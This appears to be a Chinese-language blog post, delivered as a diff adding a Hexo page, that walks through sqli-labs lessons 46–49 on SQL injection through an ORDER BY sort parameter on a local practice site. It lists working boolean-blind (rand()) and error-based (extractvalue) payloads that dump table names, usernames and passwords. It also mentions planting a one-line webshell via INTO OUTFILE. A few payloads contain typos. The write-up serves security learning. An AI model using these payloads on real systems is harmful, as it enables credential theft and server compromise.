@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>sql-labs-Less-46~49 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Less-46  进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-46&#x2F;，显示如下； 和之前的关卡有点不一样。这关我们要输入?sort&#x3D;1， 没有什么报错信息，应该是正常输出。我们输入?sort&#x3D;4时，发生报错： 显示说有未知的列，说明这可能和列有关，再分别输入?sort&#x3D;2、?sirt&#x3D;3： 发现相应的列都进行了从小到大的排列。这和order by的作用很想，所以可能和order by有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-labs-Less-46~49">
+<meta property="og:url" content="http://example.com/2021/02/23/sql-labs-Less-46~49/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Less-46  进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-46&#x2F;，显示如下； 和之前的关卡有点不一样。这关我们要输入?sort&#x3D;1， 没有什么报错信息，应该是正常输出。我们输入?sort&#x3D;4时，发生报错： 显示说有未知的列，说明这可能和列有关，再分别输入?sort&#x3D;2、?sirt&#x3D;3： 发现相应的列都进行了从小到大的排列。这和order by的作用很想，所以可能和order by有">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/1.png">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/2.png">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/3.png">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/4.png">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/5.png">
+<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/6.png">
+<meta property="article:published_time" content="2021-02-23T03:50:16.000Z">
+<meta property="article:modified_time" content="2021-02-23T13:45:00.871Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sql-labs-Less-46~49" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/23/sql-labs-Less-46~49/" class="article-date">
+  <time datetime="2021-02-23T03:50:16.000Z" itemprop="datePublished">2021-02-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql-labs-Less-46~49
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-46</h1>
+
+<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/%EF%BC%8C%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B%EF%BC%9B">http://127.0.0.1/sql/Less-46/，显示如下；</a></p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/1.png" alt="1"><br>和之前的关卡有点不一样。这关我们要输入?sort=1，</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/2.png" alt="2"><br>没有什么报错信息，应该是正常输出。<br>我们输入?sort=4时，发生报错：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/3.png" alt="3"><br>显示说有未知的列，说明这可能和列有关，再分别输入?sort=2、?sirt=3：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/4.png" alt="4"><br>发现相应的列都进行了从小到大的排列。这和order by的作用很想，所以可能和order by有关。<br>再分别输入desc（从大到小排）和asc（从小到大排），如果显示结果不同，则表明可以注入。<br>我们输入?sort=1’，发生报错：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/5.png" alt="5"><br>里面只有一个’被一对’括起来，说明无注入字符。<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=3">http://127.0.0.1/sql/Less-46/?sort=3</a> and left(database(),1)=’a’，正常输出，说明不能用布尔盲注。但是可以用rand()函数进行布尔盲注。<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> union select 1，报错，说明不能用联合注入。<br>因为报错了，所以可以用报错注入，也可以用延时注入。<br><br><br>构造语句：<br>1)直接添加注入语句，?sort=(select <strong>**</strong>)<br>2)利用一些函数。例如 rand()函数等。?sort=rand(sql语句)<br>3)利用 and，例如?sort=1 and (加sql语句)</p>
+<p>这里先演示后两种：<br>2)rand()函数<br>先看一下rand的一些性质：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/6.png" alt="6"><br>这里可以看到true和false的排序是不一样的，所以我们可以把盲注常用语句放到里面进行布尔盲注。<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand(left(database(),1)&gt;=0x61">http://127.0.0.1/sql/Less-46/?sort=rand(left(database(),1)&gt;=0x61</a> and left(database(),1)&lt;=0x7a)–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(left((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) &gt;= 0x61 and left((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) &lt;= 0x7a)–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(left((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1) &gt;= 0x61 and left((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1) &lt;= 0x7a)–+<br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(ascii(left((select id from users limit 0,1),1)) &gt;= 20 and ascii(left((select id from users limit 0,1),1)) &lt;=126)–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(ascii(left((select username from users limit 0,1),1)) &gt;= 20 and ascii(left((select username from users limit 0,1),1)) &lt;=126)–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(ascii(left((select password from users limit 0,1),1)) &gt;= 20 and ascii(left((select password from users limit 0,1),1)) &lt;=126)–+</p>
+<p><code>PS：里面0x开头的是16进制，可以在hackbar里进行反转码，不要选中0x</code></p>
+<p>3)and 报错/延时<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,database()))–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’)))–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’)))–+<br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select id from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select password from users limit 0,1)))–+<br><br><br>还有一个procedure analyse函数能和报错注入语句一起用<br>基本格式：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> procedure analyse(报错注入语句,1)–+<br><br><br>也可以用into outfile导入一句话木马，然后和菜刀连接。</p>
+<h1>Less-47</h1>
+
+<p>和Less-46一样，注入字符是’，这关不知道怎么用rand函数，报错和延时还是可以用的。</p>
+<h1>Less-48</h1>
+
+<p>和Less-46一样，只不过没有报错回显了，其他方法可以用。</p>
+<h1>Less-49</h1>
+
+<p>和Less-47一样，只不过没有报错回显了，其他方法可以用。</p>
+<h1>小结</h1>
+
+<p>order by后的injection：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762732.html">https://www.cnblogs.com/lcamry/p/5762732.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/23/sql-labs-Less-46~49/" data-id="ckli29kzj0000d4ux6cef5el1" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/02/23/sql-labs-Less-46/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sql-labs-Less-46
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/02/22/sql-labs-Less-42~45/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sql-labs-Less-42~45</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/02/23/sql-labs-Less-46/">sql-labs-Less-46</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/23/sql-labs-Less-46~49/">sql-labs-Less-46~49</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/22/sql-labs-Less-42~45/">sql-labs-Less-42~45</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/21/sql-labs-Less-38~41/">sql-labs-Less-38~41</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/21/sql-labs-Less-36-37/">sql-labs-Less-36~37</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
